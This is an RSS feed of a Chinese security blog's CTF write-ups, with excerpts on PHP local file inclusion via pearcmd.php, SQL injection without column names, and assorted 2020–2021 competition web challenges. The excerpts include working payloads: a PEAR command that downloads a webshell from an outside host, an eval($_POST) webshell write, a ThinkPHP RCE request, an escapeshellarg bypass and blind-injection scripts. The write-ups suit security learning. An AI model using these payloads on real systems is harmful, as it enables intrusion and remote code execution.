<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on k1te's blog</title><link>https://k1te.cn/tags/ctf/</link><description>Recent content in ctf on k1te's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jan 2022 10:10:38 +0800</lastBuildDate><atom:link href="https://k1te.cn/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>LFI 新姿势学习</title><link>https://k1te.cn/2022/01/10/LFI%E5%AD%A6%E4%B9%A0/</link><pubDate>Mon, 10 Jan 2022 10:10:38 +0800</pubDate><guid>https://k1te.cn/2022/01/10/LFI%E5%AD%A6%E4%B9%A0/</guid><description>前几天p牛在星球里分享了新的LFI技巧，刚好考完试了过来学习一下
pearcmd.php config-create 这个并不是上面说的新trick，而是p牛十一月份就发了的：Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)，当时十一月份湖湘杯我们还在辛苦地session文件包含，结束后发现大家都是用pearcmd.php，只能说多学习。具体原理参考上面p牛的文章，这里就单纯做个记录方便自己查阅
这里使用的是2021湖湘杯easywill，如果仿照p牛的payload，那么最终的payload如下：
1 ?+config-create+/&amp;amp;name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php (注意，请使用burp发包，否则尖括号会被url编码，此处只是演示)
可以看到我们的name和value变量成功传入，同时$_SERVER['argv']也成功解析，需要注意的是config-create必须在$_SERVER['argv']数组的第二个位置，然后后面两个参数紧随其后，否则会报错，所以config-create前面还有一个+号，使得第0个元素为空，这个应该是php源码的处理，这里就没有再往下跟了。
综上，我们还可以将payload改成：
1 /?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+config-create+/&amp;lt;?=phpinfo()?&amp;gt;+/tmp/hello.php 可以实现同样的效果
install 在学习p牛文章的过程中找到了bfengj师傅的一篇文章：利用pearcmd.php从LFI到getshell，里面介绍了pear的另一个利用方法：
1 pear install -R /tmp http://xxxxxxx/shell.php 这个方法可以直接把我们的webshell下载到靶机从而实现RCE
回到我们easywill的环境，payload：
1 url?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://ip:port/info.php 同时，在这片文章中还学到了config-create的另一个用法：
我们可以使用pear -c file -d foo=bar -s达到同样的写配置文件的目的，在easywill中的payload如下：
1 /?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+-c+/tmp/shell.php+-d+man_dir=&amp;lt;?eval($_POST[0]);?&amp;gt;+-s+ 最后一个+号好像没有也可以。
限制 今天早上写的时候刚好在p牛的星球看到Smity师傅发的文章，大概意思是php官方的镜像确实如p牛所说，但是如果是使用apt install php下载的php（据该师傅所言，大多数ctf docker的制作方式都是这个），那么这个环境就和P牛所说的环境有两个不同：
pearcmd.php在/usr/share/php/pearcmd.php register_argc_argv在php.ini中默认关闭 如果说第一个还可以调整，那么第二个限制则是致命的。
可能是我的运气比较好，也可能是我比较懒，easywill的环境我刚好是根据php官方镜像搭建的，所以没踩到这个坑。
利用 Nginx 产生临时文件 这个技巧来源于hxp2021，不过我并没有打这个比赛，而是如开头所说通过p牛的星球了解到的，看了Zeddy大佬的文章只能说叹为观止。
总结起来整个过程就是：</description></item><item><title>2021第五空间线上web</title><link>https://k1te.cn/2021/09/16/5space2021/</link><pubDate>Thu, 16 Sep 2021 19:47:24 +0800</pubDate><guid>https://k1te.cn/2021/09/16/5space2021/</guid><description>躺了
WebFTP 根据指纹找到了github上的源码：wifeat/WebFTP
默认的密码admin888无法登录，账户信息存在Data/User/md5(username).php中，从代码逻辑上看不出什么漏洞
发现Readme目录下有一个php探针，刚开始进去四处点 点不出东西，然后看了下源码发现提交act参数即可拿到phpinfo，然后flag在phpinfo里边
payload：/Readme/mytz.php?act=phpinfo
pklovecloud (不是很懂题目“pklovecloud”是啥意思。。。
直接给源码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 &amp;lt;?</description></item><item><title>DasJuly X CBCTF 4th 部分wp</title><link>https://k1te.cn/2021/08/03/DasJuly/</link><pubDate>Tue, 03 Aug 2021 10:42:08 +0800</pubDate><guid>https://k1te.cn/2021/08/03/DasJuly/</guid><description>emm，怎么说呢，可能是为了配合夏令营吧，大部分都是框架题，网上搜一下就差不多能找到了，但是实话实说，题目质量确实一般
Web ezrce 参考：Yapi远程命令执行漏洞复现 - FreeBuf网络安全行业门户，直接打就行
cat flag 直接给源码：
1 2 3 4 5 6 7 8 9 10 11 12 &amp;lt;?php if (isset($_GET[&amp;#39;cmd&amp;#39;])) { $cmd = $_GET[&amp;#39;cmd&amp;#39;]; if (!preg_match(&amp;#39;/flag/i&amp;#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(&amp;#39;cat &amp;#39; . $cmd); } } else { highlight_file(__FILE__); } ?&amp;gt; cmd参数不能包含flag关键词，然后经过escapeshellarg函数之后执行cat命令。
有个hint：管理员曾访问过flag。
经过一番查找，找到了nignx的access.log，payload:/?cmd=/var/log/nginx/access.log，可以看到有一个/this_is_final_flag_e2a457126032b42d.php，应该就是要cat这个文件了，但是文件名里包含了flag关键词，而且又经过了escapeshellarg函数，没法命令注入
找了蛮久的，最后在文档里找到这么一个评论
意思大概是escapeshellarg会在没有设置lang环境变量的时候将非ASCII字符丢弃，所以我们可以使用非ASCII字符绕过，最终payload：/?cmd=this_is_final_fl%ffag_e2a457126032b42d.php
其实早上的时候就看到了相关的文章：
但是当时尝试的是ā这个字符，不知道为啥不行
easythinkphp 一个thinkphp3.2.3比较新的洞，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报 (qq.com)
最终payload：/?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=../../../flag
jspxcms 参考：复现jspxcms解压getshell漏洞 | lockcy&amp;rsquo;s cave
需要管理员的权限，比赛的时候是公用靶机，每十分钟重置一次，刚开始的时候进不了后台找不到点，后面就盯着重置然后冲进去改密码hh
需要用到冰蝎，冰蝎的坑具体参考：为啥子java14还是运行不了 · Issue #115 · rebeyond/Behinder (github.</description></item><item><title>CyBRICS2021</title><link>https://k1te.cn/2021/07/26/cyBrics2021/</link><pubDate>Mon, 26 Jul 2021 14:42:08 +0800</pubDate><guid>https://k1te.cn/2021/07/26/cyBrics2021/</guid><description>全程被队友们带飞，虽然最后的成绩肯定比不上大佬们的战队，但还是玩的很开心
Web Ad Network 左上角有一张图片，点击之后会不停地重定向，我们只需要修改浏览器的重定向次数，然后让浏览器一直跳就可以了：
Announcement 注入点在email处，insert注入，左边的digest是email的md5：
简单的报错注入，因为不想频繁算md5，于是写了个脚本:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import requests import hashlib import re session = requests.Session() def genearteMD5(str): # 创建md5对象 hl = hashlib.md5() # Tips # 此处必须声明encode # 否则报错为：hl.update(str) Unicode-objects must be encoded before hashing hl.</description></item><item><title>ctf无列名注入小结</title><link>https://k1te.cn/2021/05/19/no-column-sql-injection/</link><pubDate>Wed, 19 May 2021 22:10:17 +0800</pubDate><guid>https://k1te.cn/2021/05/19/no-column-sql-injection/</guid><description>ctf无列名注入小结 其实之前也遇到过类似的题目，但是拖延症太严重了，一直没有仔细研究，正好这次国赛初赛也有一道无列名注入的题目，好好学习一下。
无列名注入一般伴随着bypass information_schema，当这个表被过滤的时候，我们只能使用sys.schema_auto_increment_columns、sys.schema_table_statistics_with_buffer、mysql.innodb_table_stats等等进行绕过，但是这些表中一般都没有字段名，只能获得表名，所以当我们知道表明之后，还需要进一步地使用无列名注入
一、列名重复（join……using） 条件：需要开启报错
直接拿sqli-labs的email表来做演示（后面也会使用这个表）：
假设我们已经bypass了information_schema并且获得了emails这个表名，这时候我们可以使用?id=1' union select * from (select * from emails a join emails b)c--+dump出第一个字段名：
紧接着使用?id=1' union select * from (select * from emails a join emails b using(id))c--+dump出第二个字段名：
一般网上的文章到这里就结束了，但是搞不明白原理是啥（可能是因为我太菜了），所以自己又接着往下研究。
当我们继续使用?id=1' union select * from (select * from emails a join emails b using(id,email_id))c--+，会报列数不一致的错误：
因为这个时候已经select成功了，但是只有两列，而union前面的语句有三列，所以列数不一致，在命令行里是可以成功select的：
或者这样：
所以join……using到底是啥呢，我又去Google了一下：SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。
join有不同的类型：
INNER JOIN：如果表中有至少一个匹配，则返回行 LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 FULL JOIN：只要其中一个表中存在匹配，则返回行 其中inner join 和 join是相同的
security中还有一个users表如下：</description></item><item><title>VNCTF2021</title><link>https://k1te.cn/2021/03/14/VNCTF/</link><pubDate>Sun, 14 Mar 2021 01:47:24 +0800</pubDate><guid>https://k1te.cn/2021/03/14/VNCTF/</guid><description>Ezgame 在网上找到这个游戏的源码，然后在game.js中搜索win关键词，发现当winTimer.IsSet()返回True时，游戏胜利。
然后在其他文件里找找，就可以在gameEngine.js中找到Timer类的isSet方法：
IsSet() { return this.endTime &amp;gt; 0; }
所以我们可以直接在控制台输入：winTimer.endTime = 1
然而，有大佬直接从网站源码中解出了flag：
在源码里面找到了一堆奇怪的东西：
丢到一个在线加密网站，解密得到flag：
tql
（原来直接丢到控制台回车就出来了。。。
realezjvav[复现] 第一关是一个笛卡尔积注入，其实当时fuzz出来之后发现sleep benchmark RLIKE get_lock都被ban了，只剩笛卡尔积了，奈何还是太菜了，一直没办法延时，最后又跑去想是不是别的方向。。。
自己写的脚本：（本来想用三个table的组合，会延时1s左右，但是不知道为啥有时候正常的请求会有5s的延时，所以改用两个table加一个column，这样大概会有13秒左右的延时，然后时差&amp;gt;10s即可；time.sleep(0.1)是怕buu的容器429Too Many Requests）
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import requests import time url = &amp;#34;http://0ce14b29-a69c-47eb-9aa1-2c0c972e4125.node3.buuoj.cn/user/login&amp;#34; ans = &amp;#34;&amp;#34; for i in range(1, 100): flag = 1 for j in range(31,127): # password：no_0ne_kn0w_th1s payload = &amp;#34;1&amp;#39; and if(ascii(substr(password,&amp;#34;+ str(i) +&amp;#34;,1))&amp;gt;&amp;#34;+ str(j) +&amp;#34;,0,(SELECT count(*) FROM information_schema.</description></item><item><title>2021大吉大利杯</title><link>https://k1te.cn/2021/01/24/DJBCTF2021/</link><pubDate>Sun, 24 Jan 2021 17:01:00 +0800</pubDate><guid>https://k1te.cn/2021/01/24/DJBCTF2021/</guid><description>大吉大利杯web部分wp 菜炸了，一部分题是自己做出来的，一部分题是看wp复现的
spaceman php代码审计，源码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); class spaceman { public $username; public $password; public function __construct($username,$password) { $this-&amp;gt;username = $username; $this-&amp;gt;password = $password; } public function __wakeup() { if($this-&amp;gt;password===&amp;#39;ctfshowvip&amp;#39;) { include(&amp;#34;flag.php&amp;#34;); echo $flag; } else { echo &amp;#39;wrong password&amp;#39;; } } } function filter($string){ return str_replace(&amp;#39;ctfshowup&amp;#39;,&amp;#39;ctfshow&amp;#39;,$string); } $str = file_get_contents(&amp;#34;php://input&amp;#34;); if(preg_match(&amp;#39;/\_|\.</description></item><item><title>BJDCTF2020</title><link>https://k1te.cn/2020/09/28/BJDCTF2020/</link><pubDate>Mon, 28 Sep 2020 14:42:08 +0800</pubDate><guid>https://k1te.cn/2020/09/28/BJDCTF2020/</guid><description>BJDCTF2020 wp 在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。
Easy MD5 打开网址之后，在响应标头中找到了hint：
1 select*from&amp;#39;admin&amp;#39;wherepassword=md5($pass,true) 理论上md5的密码验证是很难破解的，但是这里MD5函数的第二个参数设为true就有漏洞。
1 2 3 4 md5(&amp;#34;hello&amp;#34;); &amp;gt;&amp;gt;5d41402abc4b2a76b9719d911017c592 md5(&amp;#34;hello&amp;#34;,true); &amp;gt;&amp;gt;]A@*�K*v�q��Œ 32字符十六进制数很好理解，16进制字符二进制格式并非真的二进制，二十将十六进制数两个一组，转化成ASCII字符，如，5d =》],41=&amp;gt;A
因此可以输入特定的字符串，使得md5之后的raw_output中含有or。网上找到了两个：
1 2 3 4 5 md5(&amp;#34;ffifdyop&amp;#34;,true); &amp;gt;&amp;gt;&amp;#39;or&amp;#39;6�]��!r,��b md5(&amp;#34;129581926211651571912466741651878684928&amp;#34;,true); &amp;gt;&amp;gt;�T0D��o#��&amp;#39;or&amp;#39;8 //第二个在该题中无效 第二层是MD5碰撞：
1 2 3 4 5 6 7 &amp;lt;!-- $a = $GET[&amp;#39;a&amp;#39;]; $b = $_GET[&amp;#39;b&amp;#39;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --&amp;gt; 因为使用的是!</description></item></channel></rss>